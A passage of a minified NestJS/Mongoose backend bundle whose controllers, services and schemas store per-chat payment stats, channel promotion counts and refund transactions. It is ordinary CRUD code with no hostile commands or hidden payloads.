d=class{};t.PromoteStatModule=d,t.PromoteStatModule=d=i([(0,r.Module)({imports:[n.initModule,a.MongooseModule.forFeature([{name:l.PromoteStat.name,collection:"promoteStats",schema:l.PromoteStatSchema}]),p.ClientModule],controllers:[c.PromoteStatController],providers:[s.PromoteStatService],exports:[s.PromoteStatService]})],d)},1630:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteStatService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(937),p=o(5562);let d=class{constructor(e,t){this.promoteStatModel=e,this.clientService=t}async create(e){return new this.promoteStatModel(e).save()}async findAll(){return await this.promoteStatModel.find().sort({totalCount:-1}).exec()}async findByClient(e){const t=await this.promoteStatModel.findOne({client:e}).exec();if(!t)throw new a.NotFoundException(`PromoteStat not found for client ${e}`);return t}async update(e,t){const o=await this.promoteStatModel.findOneAndUpdate({client:e},t,{new:!0}).exec();if(!o)throw new a.NotFoundException(`PromoteStat not found for client ${e}`);return o}async deleteOne(e){if(0===(await this.promoteStatModel.deleteOne({client:e}).exec()).deletedCount)throw new a.NotFoundException(`PromoteStat not found for client ${e}`)}async deleteAll(){await this.promoteStatModel.deleteMany({}).exec()}async reinitPromoteStats(){const e=await this.findAll();for(const t of e)await this.promoteStatModel.updateOne({client:t.client},{$set:{totalCount:0,uniqueChannels:0,releaseDay:Date.now(),lastUpdatedTimeStamp:Date.now(),data:{}}})}};t.PromoteStatService=d,t.PromoteStatService=d=i([(0,a.Injectable)(),r(0,(0,s.InjectModel)(l.PromoteStat.name)),r(1,(0,a.Inject)((0,a.forwardRef)((()=>p.ClientService)))),n("design:paramtypes",[c.Model,p.ClientService])],d)},937:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteStatSchema=t.PromoteStat=void 0;const r=o(5839),a=o(9742);let s=class{};t.PromoteStat=s,i([(0,a.ApiProperty)({example:"shruthi1",description:"Client ID"}),(0,r.Prop)({required:!0,unique:!0}),n("design:type",String)],s.prototype,"client",void 0),i([(0,a.ApiProperty)({example:{Girls_Chating_Group_07:4,girls_friends_chatting_group_01:14},description:"Data"}),(0,r.Prop)({required:!0,type:Map,of:Number}),n("design:type",Map)],s.prototype,"data",void 0),i([(0,a.ApiProperty)({example:552,description:"Total Count"}),(0,r.Prop)({required:!0}),n("design:type",Number)],s.prototype,"totalCount",void 0),i([(0,a.ApiProperty)({example:314,description:"Unique Channels"}),(0,r.Prop)({required:!0}),n("design:type",Number)],s.prototype,"uniqueChannels",void 0),i([(0,a.ApiProperty)({example:1719929752982,description:"Release Day"}),(0,r.Prop)({required:!0}),n("design:type",Number)],s.prototype,"releaseDay",void 0),i([(0,a.ApiProperty)({example:!0,description:"Is Active"}),(0,r.Prop)({required:!0}),n("design:type",Boolean)],s.prototype,"isActive",void 0),i([(0,a.ApiProperty)({example:1719929752982,description:"Last Updated TimeStamp"}),(0,r.Prop)({required:!0}),n("design:type",Number)],s.prototype,"lastUpdatedTimeStamp",void 0),i([(0,a.ApiProperty)({example:["And_Girls_Boys_Group_Chatting","Girls_Chating_Group_07"],description:"Channels"}),(0,r.Prop)({required:!0,type:[String]}),n("design:type",Array)],s.prototype,"channels",void 0),t.PromoteStat=s=i([(0,r.Schema)()],s),t.PromoteStatSchema=r.SchemaFactory.createForClass(s)},3255:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateStatDto=void 0;const r=o(9742);class a{}t.CreateStatDto=a,i([(0,r.ApiProperty)({example:"6785668464",description:"Chat ID"}),n("design:type",String)],a.prototype,"chatId",void 0),i([(0,r.ApiProperty)({example:12,description:"Count"}),n("design:type",Number)],a.prototype,"count",void 0),i([(0,r.ApiProperty)({example:50,description:"Pay Amount"}),n("design:type",Number)],a.prototype,"payAmount",void 0),i([(0,r.ApiProperty)({example:!0,description:"Demo Given"}),n("design:type",Boolean)],a.prototype,"demoGiven",void 0),i([(0,r.ApiProperty)({example:!0,description:"Demo Given Today"}),n("design:type",Boolean)],a.prototype,"demoGivenToday",void 0),i([(0,r.ApiProperty)({example:!1,description:"New User"}),n("design:type",Boolean)],a.prototype,"newUser",void 0),i([(0,r.ApiProperty)({example:!0,description:"Paid Reply"}),n("design:type",Boolean)],a.prototype,"paidReply",void 0),i([(0,r.ApiProperty)({example:"Amaan Khan",description:"Name"}),n("design:type",String)],a.prototype,"name",void 0),i([(0,r.ApiProperty)({example:!1,description:"Second Show"}),n("design:type",Boolean)],a.prototype,"secondShow",void 0),i([(0,r.ApiProperty)({example:null,description:"Did Pay"}),n("design:type",Boolean)],a.prototype,"didPay",void 0),i([(0,r.ApiProperty)({example:"shruthi1",description:"Client"}),n("design:type",String)],a.prototype,"client",void 0),i([(0,r.ApiProperty)({example:"shruthi",description:"Profile"}),n("design:type",String)],a.prototype,"profile",void 0)},8890:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.StatController=void 0;const a=o(3563),s=o(9742),c=o(2790),l=o(3255),p=o(7180);let d=class{constructor(e){this.statService=e}async create(e){return this.statService.create(e)}async findByChatIdAndProfile(e,t){return this.statService.findByChatIdAndProfile(e,t)}async update(e,t,o){return this.statService.update(e,t,o)}async deleteOne(e,t){return this.statService.deleteOne(e,t)}async deleteAll(){return this.statService.deleteAll()}};t.StatController=d,i([(0,a.Post)(),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[l.CreateStatDto]),n("design:returntype",Promise)],d.prototype,"create",null),i([(0,a.Get)(":chatId/:profile"),r(0,(0,a.Param)("chatId")),r(1,(0,a.Param)("profile")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],d.prototype,"findByChatIdAndProfile",null),i([(0,a.Put)(":chatId/:profile"),r(0,(0,a.Param)("chatId")),r(1,(0,a.Param)("profile")),r(2,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,String,p.UpdateStatDto]),n("design:returntype",Promise)],d.prototype,"update",null),i([(0,a.Delete)(":chatId/:profile"),r(0,(0,a.Param)("chatId")),r(1,(0,a.Param)("profile")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],d.prototype,"deleteOne",null),i([(0,a.Delete)(),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],d.prototype,"deleteAll",null),t.StatController=d=i([(0,s.ApiTags)("stats"),(0,a.Controller)("stats"),n("design:paramtypes",[c.StatService])],d)},4181:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.StatModule=void 0;const n=o(3563),r=o(5839),a=o(2790),s=o(8890),c=o(8126),l=o(5774);let p=class{};t.StatModule=p,t.StatModule=p=i([(0,n.Module)({imports:[l.initModule,r.MongooseModule.forFeature([{name:"StatsModule",collection:"stats",schema:c.StatSchema}])],controllers:[s.StatController],providers:[a.StatService],exports:[a.StatService]})],p)},8126:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.StatSchema=t.Stat=void 0;const r=o(5839),a=o(9742);let s=class{};t.Stat=s,i([(0,a.ApiProperty)({example:"6785668464",description:"Chat ID"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"chatId",void 0),i([(0,a.ApiProperty)({example:12,description:"Count"}),(0,r.Prop)({required:!0}),n("design:type",Number)],s.prototype,"count",void 0),i([(0,a.ApiProperty)({example:50,description:"Pay Amount"}),(0,r.Prop)({required:!0}),n("design:type",Number)],s.prototype,"payAmount",void 0),i([(0,a.ApiProperty)({example:!0,description:"Demo Given"}),(0,r.Prop)({required:!0}),n("design:type",Boolean)],s.prototype,"demoGiven",void 0),i([(0,a.ApiProperty)({example:!0,description:"Demo Given Today"}),(0,r.Prop)({required:!0}),n("design:type",Boolean)],s.prototype,"demoGivenToday",void 0),i([(0,a.ApiProperty)({example:!1,description:"New User"}),(0,r.Prop)({required:!0}),n("design:type",Boolean)],s.prototype,"newUser",void 0),i([(0,a.ApiProperty)({example:!0,description:"Paid Reply"}),(0,r.Prop)({required:!0}),n("design:type",Boolean)],s.prototype,"paidReply",void 0),i([(0,a.ApiProperty)({example:"Amaan Khan",description:"Name"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"name",void 0),i([(0,a.ApiProperty)({example:!1,description:"Second Show"}),(0,r.Prop)({required:!0}),n("design:type",Boolean)],s.prototype,"secondShow",void 0),i([(0,a.ApiProperty)({example:null,description:"Did Pay"}),(0,r.Prop)({required:!1}),n("design:type",Boolean)],s.prototype,"didPay",void 0),i([(0,a.ApiProperty)({example:"shruthi1",description:"Client"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"client",void 0),i([(0,a.ApiProperty)({example:"shruthi",description:"Profile"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"profile",void 0),t.Stat=s=i([(0,r.Schema)()],s),t.StatSchema=r.SchemaFactory.createForClass(s),t.StatSchema.index({chatId:1,profile:1,client:1},{unique:!0})},2790:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.StatService=void 0;const a=o(3563),s=o(5839),c=o(6037);let l=class{constructor(e){this.statModel=e}async create(e){return new this.statModel(e).save()}async findAll(){return await this.statModel.find().exec()}async findByChatIdAndProfile(e,t){const o=await this.statModel.findOne({chatId:e,profile:t}).exec();if(!o)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`);return o}async update(e,t,o){const i=await this.statModel.findOneAndUpdate({chatId:e,profile:t},o,{new:!0}).exec();if(!i)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`);return i}async deleteOne(e,t){if(0===(await this.statModel.deleteOne({chatId:e,profile:t}).exec()).deletedCount)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`)}async deleteAll(){await this.statModel.deleteMany({}).exec()}};t.StatService=l,t.StatService=l=i([(0,a.Injectable)(),r(0,(0,s.InjectModel)("StatsModule")),n("design:paramtypes",[c.Model])],l)},7180:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateStatDto=void 0;const i=o(9742),n=o(3255);class r extends((0,i.PartialType)(n.CreateStatDto)){}t.UpdateStatDto=r},1415:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateStatDto=void 0;const r=o(9742);class a{}t.CreateStatDto=a,i([(0,r.ApiProperty)({example:"6785668464",description:"Chat ID"}),n("design:type",String)],a.prototype,"chatId",void 0),i([(0,r.ApiProperty)({example:12,description:"Count"}),n("design:type",Number)],a.prototype,"count",void 0),i([(0,r.ApiProperty)({example:50,description:"Pay Amount"}),n("design:type",Number)],a.prototype,"payAmount",void 0),i([(0,r.ApiProperty)({example:!0,description:"Demo Given"}),n("design:type",Boolean)],a.prototype,"demoGiven",void 0),i([(0,r.ApiProperty)({example:!0,description:"Demo Given Today"}),n("design:type",Boolean)],a.prototype,"demoGivenToday",void 0),i([(0,r.ApiProperty)({example:!1,description:"New User"}),n("design:type",Boolean)],a.prototype,"newUser",void 0),i([(0,r.ApiProperty)({example:!0,description:"Paid Reply"}),n("design:type",Boolean)],a.prototype,"paidReply",void 0),i([(0,r.ApiProperty)({example:"Amaan Khan",description:"Name"}),n("design:type",String)],a.prototype,"name",void 0),i([(0,r.ApiProperty)({example:!1,description:"Second Show"}),n("design:type",Boolean)],a.prototype,"secondShow",void 0),i([(0,r.ApiProperty)({example:null,description:"Did Pay"}),n("design:type",Boolean)],a.prototype,"didPay",void 0),i([(0,r.ApiProperty)({example:"shruthi1",description:"Client"}),n("design:type",String)],a.prototype,"client",void 0),i([(0,r.ApiProperty)({example:"shruthi",description:"Profile"}),n("design:type",String)],a.prototype,"profile",void 0)},9531:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.Stat2Controller=void 0;const a=o(3563),s=o(9742),c=o(8504),l=o(1415),p=o(5986);let d=class{constructor(e){this.statService=e}async create(e){return this.statService.create(e)}async findByChatIdAndProfile(e,t){return this.statService.findByChatIdAndProfile(e,t)}async update(e,t,o){return this.statService.update(e,t,o)}async deleteOne(e,t){return this.statService.deleteOne(e,t)}async deleteAll(){return this.statService.deleteAll()}};t.Stat2Controller=d,i([(0,a.Post)(),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[l.CreateStatDto]),n("design:returntype",Promise)],d.prototype,"create",null),i([(0,a.Get)(":chatId/:profile"),r(0,(0,a.Param)("chatId")),r(1,(0,a.Param)("profile")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],d.prototype,"findByChatIdAndProfile",null),i([(0,a.Put)(":chatId/:profile"),r(0,(0,a.Param)("chatId")),r(1,(0,a.Param)("profile")),r(2,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,String,p.UpdateStatDto]),n("design:returntype",Promise)],d.prototype,"update",null),i([(0,a.Delete)(":chatId/:profile"),r(0,(0,a.Param)("chatId")),r(1,(0,a.Param)("profile")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],d.prototype,"deleteOne",null),i([(0,a.Delete)(),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],d.prototype,"deleteAll",null),t.Stat2Controller=d=i([(0,s.ApiTags)("stats2"),(0,a.Controller)("stats2"),n("design:paramtypes",[c.Stat2Service])],d)},5471:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.Stat2Module=void 0;const n=o(3563),r=o(5839),a=o(8504),s=o(9531),c=o(4060),l=o(5774);let p=class{};t.Stat2Module=p,t.Stat2Module=p=i([(0,n.Module)({imports:[l.initModule,r.MongooseModule.forFeature([{name:"Stats2Module",collection:"stats2",schema:c.StatSchema}])],controllers:[s.Stat2Controller],providers:[a.Stat2Service],exports:[a.Stat2Service]})],p)},4060:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.StatSchema=t.Stat2=void 0;const r=o(5839),a=o(9742);let s=class{};t.Stat2=s,i([(0,a.ApiProperty)({example:"6785668464",description:"Chat ID"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"chatId",void 0),i([(0,a.ApiProperty)({example:12,description:"Count"}),(0,r.Prop)({required:!0}),n("design:type",Number)],s.prototype,"count",void 0),i([(0,a.ApiProperty)({example:50,description:"Pay Amount"}),(0,r.Prop)({required:!0}),n("design:type",Number)],s.prototype,"payAmount",void 0),i([(0,a.ApiProperty)({example:!0,description:"Demo Given"}),(0,r.Prop)({required:!0}),n("design:type",Boolean)],s.prototype,"demoGiven",void 0),i([(0,a.ApiProperty)({example:!0,description:"Demo Given Today"}),(0,r.Prop)({required:!0}),n("design:type",Boolean)],s.prototype,"demoGivenToday",void 0),i([(0,a.ApiProperty)({example:!1,description:"New User"}),(0,r.Prop)({required:!0}),n("design:type",Boolean)],s.prototype,"newUser",void 0),i([(0,a.ApiProperty)({example:!0,description:"Paid Reply"}),(0,r.Prop)({required:!0}),n("design:type",Boolean)],s.prototype,"paidReply",void 0),i([(0,a.ApiProperty)({example:"Amaan Khan",description:"Name"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"name",void 0),i([(0,a.ApiProperty)({example:!1,description:"Second Show"}),(0,r.Prop)({required:!0}),n("design:type",Boolean)],s.prototype,"secondShow",void 0),i([(0,a.ApiProperty)({example:null,description:"Did Pay"}),(0,r.Prop)({required:!1}),n("design:type",Boolean)],s.prototype,"didPay",void 0),i([(0,a.ApiProperty)({example:"shruthi1",description:"Client"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"client",void 0),i([(0,a.ApiProperty)({example:"shruthi",description:"Profile"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"profile",void 0),t.Stat2=s=i([(0,r.Schema)()],s),t.StatSchema=r.SchemaFactory.createForClass(s),t.StatSchema.index({chatId:1,profile:1,client:1},{unique:!0})},8504:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.Stat2Service=void 0;const a=o(3563),s=o(5839),c=o(6037);let l=class{constructor(e){this.statModel=e}async create(e){return new this.statModel(e).save()}async findByChatIdAndProfile(e,t){const o=await this.statModel.findOne({chatId:e,profile:t}).exec();if(!o)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`);return o}async update(e,t,o){const i=await this.statModel.findOneAndUpdate({chatId:e,profile:t},o,{new:!0}).exec();if(!i)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`);return i}async findAll(){return await this.statModel.find().exec()}async deleteOne(e,t){if(0===(await this.statModel.deleteOne({chatId:e,profile:t}).exec()).deletedCount)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`)}async deleteAll(){await this.statModel.deleteMany({}).exec()}};t.Stat2Service=l,t.Stat2Service=l=i([(0,a.Injectable)(),r(0,(0,s.InjectModel)("Stats2Module")),n("design:paramtypes",[c.Model])],l)},5986:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateStatDto=void 0;const i=o(9742),n=o(1415);class r extends((0,i.PartialType)(n.CreateStatDto)){}t.UpdateStatDto=r},2455:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateTransactionDto=void 0;const r=o(9742);class a{}t.CreateTransactionDto=a,i([(0,r.ApiProperty)({description:"Unique transaction ID (UTR)."}),n("design:type",String)],a.prototype,"transactionId",void 0),i([(0,r.ApiProperty)({description:"Amount involved in the transaction."}),n("design:type",Number)],a.prototype,"amount",void 0),i([(0,r.ApiProperty)({description:"Issue type reported by the user."}),n("design:type",String)],a.prototype,"issue",void 0),i([(0,r.ApiProperty)({description:"Description of issue reported by the user."}),n("design:type",String)],a.prototype,"description",void 0),i([(0,r.ApiProperty)({description:"Refund method selected by the user."}),n("design:type",String)],a.prototype,"refundMethod",void 0),i([(0,r.ApiProperty)({description:"User profile ID."}),n("design:type",String)],a.prototype,"profile",void 0),i([(0,r.ApiProperty)({description:"User chat ID."}),n("design:type",String)],a.prototype,"chatId",void 0),i([(0,r.ApiProperty)({description:"IP address of the user."}),n("design:type",String)],a.prototype,"ip",void 0)},470:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateTransactionDto=void 0;const i=o(9742),n=o(2455);class r extends((0,i.PartialType)(n.CreateTransactionDto)){}t.UpdateTransactionDto=r},2763:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.TransactionSchema=t.Transaction=void 0;const r=o(5839),a=o(6037);let s=class extends a.Document{};t.Transaction=s,i([(0,r.Prop)({required:!1}),n("design:type",String)],s.prototype,"transactionId",void 0),i([(0,r.Prop)({required:!1}),n("design:type",Number)],s.prototype,"amount",void 0),i([(0,r.Prop)({required:!1}),n("design:type",String)],s.prototype,"issue",void 0),i([(0,r.Prop)({required:!1}),n("design:type",String)],s.prototype,"description",void 0),i([(0,r.Prop)(),n("design:type",String)],s.prototype,"refundMethod",void 0),i([(0,r.Prop)({required:!1}),n("design:type",String)],s.prototype,"profile",void 0),i([(0,r.Prop)({required:!1}),n("design:type",String)],s.prototype,"chatId",void 0),i([(0,r.Prop)({required:!1}),n("design:type",String)],s.prototype,"ipAddress",void 0),t.Transaction=s=i([(0,r.Schema)({timestamps:!0})],s),t.TransactionSchema=r.SchemaFactory.createForClass(s)},8861:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TransactionController=void 0;const a=o(3563),s=o(9742),c=o(2455),l=o(470),p=o(2630);let d=class{constructor(e){this.transactionService=e}async create(e){return this.transactionService.create(e)}async findOne(e){return this.transactionService.findOne(e)}async findAll(e,t,o){return this.transactionService.findAll(e,t,o)}async update(e,t){return this.transactionService.update(e,t)}async delete(e){return this.transactionService.delete(e)}};t.TransactionController=d,i([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create a new transaction"}),(0,s.ApiResponse)({status:201,description:"Transaction created successfully."}),(0,s.ApiResponse)({status:400,description:"Invalid input."}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[c.CreateTransactionDto]),n("design:returntype",Promise)],d.prototype,"create",null),i([(0,a.Get)(":id"),(0,s.ApiOperation)({summary:"Get transaction by ID"}),(0,s.ApiResponse)({status:200,description:"Transaction retrieved successfully."}),(0,s.ApiResponse)({status:404,description:"Transaction not found."}),r(0,(0,a.Param)("id")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],d.prototype,"findOne",null),i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all transactions or search transactions"}),(0,s.ApiResponse)({status:200,description:"Transactions retrieved successfully."}),r(0,(0,a.Query)("search")),r(1,(0,a.Query)("limit")),r(2,(0,a.Query)("offset")),n("design:type",Function),n("design:paramtypes",[String,Number,Number]),n("design:returntype",Promise)],d.prototype,"findAll",null),i([(0,a.Put)(":id"),(0,s.ApiOperation)({summary:"Update a transaction by ID"}),(0,s.ApiResponse)({status:200,description:"Transaction updated successfully."}),(0,s.ApiResponse)({status:404,description:"Transaction not found."}),r(0,(0,a.Param)("id")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,l.UpdateTransactionDto]),n("design:returntype",Promise)],d.prototype,"update",null),i([(0,a.Delete)(":id"),(0,s.ApiOperation)({summary:"Delete a transaction by ID"}),(0,s.ApiResponse)({status:200,description:"Transaction deleted successfully."}),(0,s.ApiResponse)({status:404,description:"Transaction not found."}),r(0,(0,a.Param)("id")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],d.prototype,"delete",null),t.TransactionController=d=i([(0,s.ApiTags)("Transactions"),(0,a.Controller)("transactions"),n("design:paramtypes",[p.TransactionService])],d)},9605:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var 